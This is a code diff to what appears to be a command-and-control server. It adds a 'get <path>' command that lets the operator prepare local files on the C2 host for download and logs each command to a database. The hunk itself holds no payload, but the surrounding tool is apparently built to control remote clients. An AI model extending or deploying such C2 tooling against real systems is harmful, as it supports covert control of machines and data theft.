@@ -397,9 +397,55 @@ def receive_command():
 
     # If the target is the C2 server itself, execute locally and return result immediately
     if client_id == "[C2-Server]":
+        stripped = cmd.strip()
+
+        # ── Handle `get <path>` — return a download_path for the browser ──
+        import re as _re
+        get_m = _re.match(r'^get\s+(.+)$', stripped, _re.IGNORECASE)
+        if get_m:
+            raw_path = get_m.group(1).strip()
+            if raw_path.startswith("~"):
+                raw_path = os.path.expanduser(raw_path)
+            elif not os.path.isabs(raw_path):
+                raw_path = os.path.join(C2_CWD, raw_path)
+            raw_path = os.path.normpath(raw_path)
+
+            if not os.path.exists(raw_path):
+                output = f"get: {raw_path}: No such file or directory"
+                status = "error"
+                dl_path = None
+            elif os.path.isdir(raw_path):
+                output = f"get: {raw_path}: Is a directory — specify a file"
+                status = "error"
+                dl_path = None
+            elif os.path.getsize(raw_path) > 100 * 1024 * 1024:
+                output = f"get: file too large ({os.path.getsize(raw_path) // (1024*1024)} MB). Max 100 MB."
+                status = "error"
+                dl_path = None
+            else:
+                size_kb = os.path.getsize(raw_path) / 1024
+                output  = f"Ready to download: {raw_path} ({size_kb:.1f} KB)"
+                status  = "done"
+                dl_path = raw_path
+
+            row_id = save_command_to_db(cmd, client_id, cwd=_format_cwd_display(C2_CWD))
+            try:
+                conn = sqlite3.connect(DB_PATH)
+                conn.execute('UPDATE commands SET status=?, result=?, executed_at=? WHERE id=?',
+                             (status, output, time.time(), row_id))
+                conn.commit()
+                conn.close()
+            except Exception as e:
+                logger.error(f"Failed to update get command: {e}")
+            return jsonify({
+                "status": status, "command_id": row_id,
+                "result": output, "cwd": _format_cwd_display(C2_CWD),
+                "user": C2_USER,
+                "download_path": dl_path,
+            })
+
         # ── Handle `cd` specially ────────────────────────────────────
         cd_match = None
-        stripped = cmd.strip()
         if stripped == "cd" or stripped.startswith("cd ") or stripped.startswith("cd\t"):
             cd_match = stripped[2:].strip() if len(stripped) > 2 else ""
 
